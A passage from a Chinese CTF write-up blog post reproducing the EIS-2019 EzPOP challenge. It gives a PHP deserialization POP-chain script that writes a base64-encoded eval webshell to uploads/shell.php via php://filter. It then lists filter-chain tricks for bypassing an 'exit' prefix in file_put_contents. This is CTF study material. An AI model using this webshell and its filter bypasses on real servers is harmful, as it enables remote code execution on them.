class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>{</span><br><span class="line">        <span class="keyword">$this</span>-&gt;store = <span class="keyword">new</span> B;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;expire = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;key = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;autosave = <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;cache = [];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;complete = <span class="string">&apos;aaa&apos;</span>.base64_encode(<span class="string">&apos;&lt;?=@eval($_REQUEST[&quot;c0r1&quot;]);?&gt;&apos;</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>{</span><br><span class="line">        <span class="keyword">$this</span>-&gt;writeTimes = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;options[<span class="string">&apos;prefix&apos;</span>] = <span class="string">&quot;php://filter/write=convert.base64-decode/resource=uploads/shell.php&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;options[<span class="string">&apos;data_compress&apos;</span>] = <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;options[<span class="string">&apos;serialize&apos;</span>] = <span class="string">&quot;lcfirst&quot;</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="keyword">new</span> A));</span><br></pre></td></tr></table></figure>
+
+<p>&#x6700;&#x540E;&#x901A;&#x8FC7;&#x8681;&#x5251;&#x8FDE;&#x63A5;&#xFF0C;&#x5373;&#x53EF;&#x83B7;&#x5F97; Flag</p>
+<h1 id="&#x603B;&#x7ED3;"><a href="#&#x603B;&#x7ED3;" class="headerlink" title="&#x603B;&#x7ED3;"></a>&#x603B;&#x7ED3;</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$content = <span class="string">&apos;&lt;?php exit; ?&gt;&apos;</span>;</span><br><span class="line">$content .= $_POST[<span class="string">&apos;txt&apos;</span>];</span><br><span class="line">file_put_contents($_POST[<span class="string">&apos;filename&apos;</span>], $content);</span><br></pre></td></tr></table></figure>
+
+<p><strong>&#x5BF9;&#x4E8E;&#x4E00;&#x4E9B; &#x201C;&#x53EF;&#x80FD;&#x5F15;&#x53D1;&#x51B2;&#x7A81;&#x7684;&#x4EE3;&#x7801;&#x201D;&#xFF0C;&#x53EF;&#x4EE5;&#x8003;&#x8651;&#x5DE7;&#x7528;&#x7F16;&#x7801;&#x4E0E;&#x89E3;&#x7801;&#x5E2E;&#x6211;&#x4EEC;&#x53BB;&#x9664;&#x4E00;&#x4E9B; &#x201C;&#x4E0D;&#x5FC5;&#x8981;&#x7684;&#x9EBB;&#x70E6;&#x201D;</strong></p>
+<p>&#x5BF9;&#x4E8E;&#x4E0A;&#x8FF0;&#x4F8B;&#x5B50;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x5148;&#x5C06; WebShell &#x8FDB;&#x884C; base64 &#x7F16;&#x7801;&#xFF0C;&#x518D;&#x5229;&#x7528; <code>php://filter</code> &#x7684; <code>strip_tags</code> &#x51FD;&#x6570;&#x53BB;&#x9664; <code>&lt;?php exit; ?&gt;</code>&#xFF0C;&#x6700;&#x540E;&#x5229;&#x7528; <code>base64-decode</code> &#x8FD8;&#x539F; WebShell</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/write=string.strip_tags|convert.base64-decode/resource=xxxx</span></span><br></pre></td></tr></table></figure>
+
+<p>&#x5728;&#x4E0D;&#x5F00;&#x542F;&#x77ED;&#x6807;&#x7B7E;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x53EF;&#x4EE5;&#x5229;&#x7528; rot13 &#x7F16;&#x7801;&#x7ED5;&#x8FC7;</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/write=string.rot13/resource=xxxx</span></span><br></pre></td></tr></table></figure>
+
+<p><a href="https://mp.weixin.qq.com/s/kfYF157ux_VAOymU5l5RFA" target="_blank" rel="noopener">&#x4E00;&#x6B21;&#x201C;SSRF&#x2013;&gt;RCE&#x201D;&#x7684;&#x8270;&#x96BE;&#x5229;&#x7528;</a> &#x4E00;&#x6587;&#x5728;&#x5B9E;&#x6218;&#x4E2D;&#x7528;&#x5230;&#x4E86;</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter//convert.iconv.UCS-2LE.UCS-2BE/resource=xxxx</span></span><br></pre></td></tr></table></figure>
+
+<p>&#x5C06;&#x76EE;&#x6807; 2 &#x4F4D;&#x4E00;&#x53CD;&#x8F6C;&#xFF0C;&#x7ED5;&#x8FC7; PHP &#x77ED;&#x6807;&#x7B7E;&#x9650;&#x5236; + &#x201D;&#x6B7B;&#x4EA1;exit&#x201C;</p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>c0r1</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://www.c0r1.com/2020/04/07/题目复现-EIS-2019-EzPOP/">http://www.c0r1.com/2020/04/07/题目复现-EIS-2019-EzPOP/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/CTF-练习/"># CTF 练习</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2020/03/25/sqli-labs-记录/">sqli-labs 记录</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© c0r1 | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
